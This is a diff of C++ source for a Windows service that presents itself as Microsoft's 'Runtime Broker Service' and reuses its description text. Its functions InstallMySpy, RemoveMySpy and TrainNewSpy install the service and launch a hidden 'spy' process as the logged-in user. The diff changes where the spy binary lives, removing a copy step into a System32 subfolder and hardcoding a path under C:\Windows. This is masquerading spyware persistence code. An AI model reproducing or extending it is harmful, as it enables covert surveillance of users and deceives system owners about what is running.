@@ -2,8 +2,6 @@
 #include <fstream>
 #include <Wtsapi32.h>
 #include <process.h>
-#include <Shlobj.h>
-#include <iostream>
 
 //Program Name
 #define SVCNAME TEXT("Runtime Broker Service")
@@ -11,6 +9,7 @@
 #define DESC TEXT("Helps manage permissions on your PC for apps from Microsoft Store.")
 //Program Version
 #define VERSION double(0.32)
+#define PATH TEXT("C:\\Windows\\Runtime Broker")
 
 SERVICE_STATUS          gSvcStatus;
 SERVICE_STATUS_HANDLE   gSvcStatusHandle;
@@ -27,7 +26,6 @@ void __cdecl ServiceWork(void* Args);
 bool TrainNewSpy(DWORD id, STARTUPINFO* si, PROCESS_INFORMATION* pi);
 void RemoveTheSpy(STARTUPINFO* si, PROCESS_INFORMATION* pi);
 DWORD getUserID();
-std::wstring directoryPath = L"C:\\Windows\\System32\\PointOfService\\ProtocolProviders\\";
 
 //###############################################################
 
@@ -44,13 +42,6 @@ std::wstring directoryPath = L"C:\\Windows\\System32\\PointOfService\\ProtocolPr
 //
 int main(int argc, char* argv[])
 {
-	if (SHCreateDirectoryEx(NULL, directoryPath.c_str(), NULL)) {
-		std::wcout << L"Already exist or something wrong " << directoryPath << std::endl;
-	}
-	else {
-		std::wcerr << L"Directory created: " << directoryPath << std::endl;
-	}
-
 	if (argc > 1)
 	{
 		if (strcmp(argv[1], "install") == 0)
@@ -105,12 +96,6 @@ VOID InstallMySpy()
 	if (!GetModuleFileName(NULL, szPath, MAX_PATH))
 	{
 		printf("Cannot install service (%d)\n", GetLastError());
-		return;
-	}
-
-	if (!CopyFile(TEXT(".\\Spy.exe"), (directoryPath + L"Runtime Broker").c_str(), false))
-	{
-		printf("Cannot copy service (%d)\n", GetLastError());
 		return;
 	}
 
@@ -189,7 +174,7 @@ VOID WINAPI RemoveMySpy()
 		return;
 	}
 
-	if (!DeleteFile((directoryPath + L"Runtime Broker").c_str()))
+	if (!DeleteFile(PATH))
 		printf("Warning! Spy cannot be deleted(%d)\n", GetLastError());
 
 	// Delete the service.
@@ -432,7 +417,7 @@ bool TrainNewSpy(DWORD id, STARTUPINFO* si, PROCESS_INFORMATION* pi)
 
 	//Create current user process
 	bool result = CreateProcessAsUser(
-		pToken, (directoryPath + L"Runtime Broker").c_str(), NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, si, pi);
+		pToken, PATH, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, si, pi);
 
 	CloseHandle(pToken);
 	return result;
